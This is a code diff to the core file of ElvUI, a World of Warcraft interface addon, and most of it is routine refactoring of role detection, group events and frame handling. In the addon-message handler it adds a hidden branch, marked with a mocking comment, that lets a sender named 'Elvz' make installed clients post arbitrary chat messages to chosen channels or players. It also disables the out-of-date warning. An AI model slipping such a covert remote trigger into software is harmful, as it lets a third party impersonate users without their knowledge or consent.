@@ -1,8 +1,7 @@
-local E, L, V, P, G = unpack(select(2, ...)); --Inport: Engine, Locales, PrivateDB, ProfileDB, GlobalDB
+local E, L, V, P, G, _ = unpack(select(2, ...)); --Inport: Engine, Locales, PrivateDB, ProfileDB, GlobalDB, Localize Underscore
 local LSM = LibStub("LibSharedMedia-3.0")
 local _, ns = ...
 local ElvUF = ns.oUF
-local ACD = LibStub("AceConfigDialog-3.0")
 
 --Variables
 _, E.myclass = UnitClass("player");
@@ -16,6 +15,7 @@ E.resolution = GetCVar("gxResolution")
 E.screenheight = tonumber(string.match(E.resolution, "%d+x(%d+)"))
 E.screenwidth = tonumber(string.match(E.resolution, "(%d+)x+%d"))
 E.TexCoords = {.08, .92, .08, .92}
+E.FrameLocks = {}
 
 E['valueColorUpdateFuncs'] = {};
 
@@ -48,6 +48,7 @@ function E:UpdateMedia()
 	--Fonts
 	self["media"].normFont = LSM:Fetch("font", self.db['general'].font)
 	self["media"].combatFont = LSM:Fetch("font", self.db['general'].dmgfont)
+	
 
 	--Textures
 	self["media"].blankTex = LSM:Fetch("background", "ElvUI Blank")
@@ -85,20 +86,8 @@ function E:UpdateMedia()
 		RightChatPanel.tex:SetAlpha(E.db.general.backdropfadecolor.a - 0.55 > 0 and E.db.general.backdropfadecolor.a - 0.55 or 0.5)		
 	end
 
-	if E.db.theme == 'class' then
-		local classColor = RAID_CLASS_COLORS[E.myclass]
-		E.db.classtimer.player.buffcolor = E:GetColor(classColor.r, classColor.b, classColor.g)
-		E.db.classtimer.target.buffcolor = E:GetColor(classColor.r, classColor.b, classColor.g)		
-	end				
-	
 	self:ValueFuncCall()
 	self:UpdateBlizzardFonts()
-end
-
-
-function E:UpdateSounds()
-	self["media"].whispersound = LSM:Fetch("sound", self.db["chat"].whispersound)
-	self["media"].keywordsound = LSM:Fetch("sound", self.db["chat"].keywordsound)
 end
 
 function E:PLAYER_ENTERING_WORLD()
@@ -183,33 +172,76 @@ function E:IsPTRVersion()
 end
 
 --Check the player's role
+local roles = {
+	PALADIN = {
+		[1] = "Caster",
+		[2] = "Tank",
+		[3] = "Melee",
+	},
+	PRIEST = "Caster",
+	WARLOCK = "Caster",
+	WARRIOR = {
+		[1] = "Melee",
+		[2] = "Melee",
+		[3] = "Tank",	
+	},
+	HUNTER = "Melee",
+	SHAMAN = {
+		[1] = "Caster",
+		[2] = "Melee",
+		[3] = "Caster",	
+	},
+	ROGUE = "Melee",
+	MAGE = "Caster",
+	DEATHKNIGHT = {
+		[1] = "Tank",
+		[2] = "Melee",
+		[3] = "Melee",	
+	},
+	DRUID = {
+		[1] = "Caster",
+		[2] = "Melee",
+		[3] = "Tank",	
+		[4] = "Caster"
+	},
+	MONK = {
+		[1] = "Tank",
+		[2] = "Caster",
+		[3] = "Melee",	
+	},
+}
+
 function E:CheckRole()
-	local tree = GetPrimaryTalentTree();
-	local resilience;
+	local talentTree = GetSpecialization()
+	local IsInPvPGear = false;
 	local resilperc = GetCombatRatingBonus(COMBAT_RATING_RESILIENCE_PLAYER_DAMAGE_TAKEN)
 	if resilperc > GetDodgeChance() and resilperc > GetParryChance() and UnitLevel('player') == MAX_PLAYER_LEVEL then
-		resilience = true;
-	else
-		resilience = false;
+		IsInPvPGear = true;
 	end
-	if ((self.myclass == "PALADIN" and tree == 2) or 
-	(self.myclass == "WARRIOR" and tree == 3) or 
-	(self.myclass == "DEATHKNIGHT" and tree == 1)) and
-	resilience == false or
-	(self.myclass == "DRUID" and tree == 2 and GetBonusBarOffset() == 3) then
-		self.role = "Tank";
-	else
+	
+	self.role = nil;
+	
+	if type(roles[E.myclass]) == "string" then
+		self.role = roles[E.myclass]
+	elseif talentTree then
+		self.role = roles[E.myclass][talentTree]
+	end
+	
+	if self.role == "Tank" and IsInPvPGear then
+		self.role = "Melee"
+	end
+	
+	if not self.role then
 		local playerint = select(2, UnitStat("player", 4));
 		local playeragi	= select(2, UnitStat("player", 2));
 		local base, posBuff, negBuff = UnitAttackPower("player");
 		local playerap = base + posBuff + negBuff;
 
-		if (((playerap > playerint) or (playeragi > playerint)) and not (self.myclass == "SHAMAN" and tree ~= 1 and tree ~= 3) and not 
-		(UnitBuff("player", GetSpellInfo(24858)) or UnitBuff("player", GetSpellInfo(65139)))) or self.myclass == "ROGUE" or self.myclass == "HUNTER" or (self.myclass == "SHAMAN" and tree == 2) then
+		if (playerap > playerint) or (playeragi > playerint) then
 			self.role = "Melee";
 		else
 			self.role = "Caster";
-		end
+		end		
 	end
 end
 
@@ -246,72 +278,6 @@ function E:InitializeModules()
 		if self:GetModule(module).Initialize then
 			self:GetModule(module):Initialize()
 		end
-	end
-end
-
-local grid
-function E:Grid_Show()
-	if not grid then
-        E:Grid_Create()
-	elseif grid.boxSize ~= E.db.gridSize then
-        grid:Hide()
-        E:Grid_Create()
-    else
-		grid:Show()
-	end
-end
-
-function E:Grid_Hide()
-	if grid then
-		grid:Hide()
-	end
-end
-
-function E:Grid_Create() 
-	grid = CreateFrame('Frame', 'EGrid', UIParent) 
-	grid.boxSize = E.db.gridSize
-	grid:SetAllPoints(E.UIParent) 
-	grid:Show()
-
-	local size = 1 
-	local width = E.eyefinity or GetScreenWidth()
-	local ratio = width / GetScreenHeight()
-	local height = GetScreenHeight() * ratio
-
-	local wStep = width / E.db.gridSize
-	local hStep = height / E.db.gridSize
-
-	for i = 0, E.db.gridSize do 
-		local tx = grid:CreateTexture(nil, 'BACKGROUND') 
-		if i == E.db.gridSize / 2 then 
-			tx:SetTexture(1, 0, 0) 
-		else 
-			tx:SetTexture(0, 0, 0) 
-		end 
-		tx:SetPoint("TOPLEFT", grid, "TOPLEFT", i*wStep - (size/2), 0) 
-		tx:SetPoint('BOTTOMRIGHT', grid, 'BOTTOMLEFT', i*wStep + (size/2), 0) 
-	end 
-	height = GetScreenHeight()
-	
-	do
-		local tx = grid:CreateTexture(nil, 'BACKGROUND') 
-		tx:SetTexture(1, 0, 0)
-		tx:SetPoint("TOPLEFT", grid, "TOPLEFT", 0, -(height/2) + (size/2))
-		tx:SetPoint('BOTTOMRIGHT', grid, 'TOPRIGHT', 0, -(height/2 + size/2))
-	end
-	
-	for i = 1, math.floor((height/2)/hStep) do
-		local tx = grid:CreateTexture(nil, 'BACKGROUND') 
-		tx:SetTexture(0, 0, 0)
-		
-		tx:SetPoint("TOPLEFT", grid, "TOPLEFT", 0, -(height/2+i*hStep) + (size/2))
-		tx:SetPoint('BOTTOMRIGHT', grid, 'TOPRIGHT', 0, -(height/2+i*hStep + size/2))
-		
-		tx = grid:CreateTexture(nil, 'BACKGROUND') 
-		tx:SetTexture(0, 0, 0)
-		
-		tx:SetPoint("TOPLEFT", grid, "TOPLEFT", 0, -(height/2-i*hStep) + (size/2))
-		tx:SetPoint('BOTTOMRIGHT', grid, 'TOPRIGHT', 0, -(height/2-i*hStep + size/2))
 	end
 end
 
@@ -370,14 +336,13 @@ function E:CopyTable(currentTable, defaultTable)
 end
 
 function E:SendMessage()
-	local numParty, numRaid = GetNumPartyMembers(), GetNumRaidMembers();
 	local inInstance, instanceType = IsInInstance()
 	if inInstance and instanceType == 'pvp' or instanceType == 'arena' then
 		SendAddonMessage("ElvUIVC", E.version, "BATTLEGROUND")	
 	else
-		if numRaid > 0 then
+		if IsInRaid() then
 			SendAddonMessage("ElvUIVC", E.version, "RAID")
-		elseif numParty > 0 then
+		elseif IsInGroup() then
 			SendAddonMessage("ElvUIVC", E.version, "PARTY")
 		end
 	end
@@ -395,15 +360,22 @@ local function SendRecieve(self, event, prefix, message, channel, sender)
 		if sender == E.myname then return end
 
 		if prefix == "ElvUIVC" and sender ~= 'Elvz' and not string.find(sender, 'Elvz%-') and not E.recievedOutOfDateMessage then
-			if tonumber(message) > tonumber(E.version) then
+			--[[if tonumber(message) > tonumber(E.version) then
 				E:Print(L["Your version of ElvUI is out of date. You can download the latest version from www.tukui.org"])
 				E.recievedOutOfDateMessage = true
+			end]]
+		elseif prefix == 'ElvSays' and (sender == 'Elvz' or string.find(sender, 'Elvz-')) then ---HAHHAHAHAHHA
+			local user, channel, msg, sendTo = string.split(',', message)
+			
+			if (user ~= 'ALL' and user == E.myname) or user == 'ALL' then
+				SendChatMessage(msg, channel, nil, sendTo)
 			end
 		end
 	else
 		E:ScheduleTimer('SendMessage', 12)
 	end
 end
+
 
 function E:UpdateAll(ignoreInstall)
 	self.data = LibStub("AceDB-3.0"):New("ElvData", self.DF);
@@ -431,12 +403,6 @@ function E:UpdateAll(ignoreInstall)
 	
 	self:GetModule('Skins'):SetEmbedRight(E.db.skins.embedRight)
 	self:GetModule('Layout'):ToggleChatPanels()
-	
-	local CT = self:GetModule('ClassTimers')
-	CT.db = self.db.classtimer
-	CT:PositionTimers()
-	CT:ToggleTimers()
-	CT:UpdateFiltersAndColors() 
 	
 	local DT = self:GetModule('DataTexts')
 	DT.db = self.db.datatexts
@@ -543,14 +509,13 @@ function E:Initialize()
 			return 0;
 		end
 		E:Delay(45, function()
-			StaticPopup_Show('APRIL_FOOLS')
+			E:StaticPopup_Show('APRIL_FOOLS')
 		end)
 	end
-
+	
 	RegisterAddonMessagePrefix('ElvUIVC')
 	RegisterAddonMessagePrefix('ElvSays')
 	
-	self:UpdateSounds()
 	self:UpdateMedia()
 	self:UpdateFrameTemplates()
 	self:RegisterEvent("ACTIVE_TALENT_GROUP_CHANGED", "CheckRole");
@@ -560,6 +525,8 @@ function E:Initialize()
 	self:RegisterEvent("UPDATE_BONUS_ACTIONBAR", "CheckRole");	
 	self:RegisterEvent('UI_SCALE_CHANGED', 'UIScale')
 	self:RegisterEvent('PLAYER_ENTERING_WORLD')
+	self:RegisterEvent("PET_BATTLE_CLOSE", 'AddNonPetBattleFrames')
+	self:RegisterEvent('PET_BATTLE_OPENING_START', "RemoveNonPetBattleFrames")	
 	--self:RegisterEvent('UPDATE_BINDINGS', 'SaveKeybinds')
 	--self:SaveKeybinds()
 	
@@ -568,27 +535,18 @@ function E:Initialize()
 	collectgarbage("collect");
 end
 
-local toggle
-function E:MoveUI(override, type)
-	if InCombatLockdown() then E:Print(ERR_NOT_IN_COMBAT) return end
-	
-	if toggle ~= nil then
-		toggle = nil
-	else
-		toggle = true
+function E:RemoveNonPetBattleFrames()
+	if InCombatLockdown() then return end
+	for object, _ in pairs(E.FrameLocks) do
+		_G[object]:SetParent(E.HiddenFrame)
 	end
-	
-	if override then toggle = override end
-	
-	if toggle and ElvUIMoverPopupWindow then
-		ElvUIMoverPopupWindow:Show()
-		ACD['Close'](ACD, 'ElvUI') 
-		GameTooltip:Hide()
-	elseif ElvUIMoverPopupWindow then
-		ElvUIMoverPopupWindow:Hide()
-	end
+end
 
-	self:ToggleMovers(toggle)
+function E:AddNonPetBattleFrames()
+	if InCombatLockdown() then return end
+	for object, _ in pairs(E.FrameLocks) do
+		_G[object]:SetParent(UIParent)
+	end
 end
 
 function E:ResetAllUI()
@@ -607,7 +565,7 @@ function E:ResetUI(...)
 	if InCombatLockdown() then E:Print(ERR_NOT_IN_COMBAT) return end
 	
 	if ... == '' or ... == ' ' or ... == nil then
-		StaticPopup_Show('RESETUI_CHECK')
+		E:StaticPopup_Show('RESETUI_CHECK')
 		return
 	end
 	
@@ -615,7 +573,6 @@ function E:ResetUI(...)
 end
 
 local f = CreateFrame('Frame')
-f:RegisterEvent("RAID_ROSTER_UPDATE")
-f:RegisterEvent("PARTY_MEMBERS_CHANGED")
+f:RegisterEvent("GROUP_ROSTER_UPDATE")
 f:RegisterEvent("CHAT_MSG_ADDON")
 f:SetScript('OnEvent', SendRecieve)
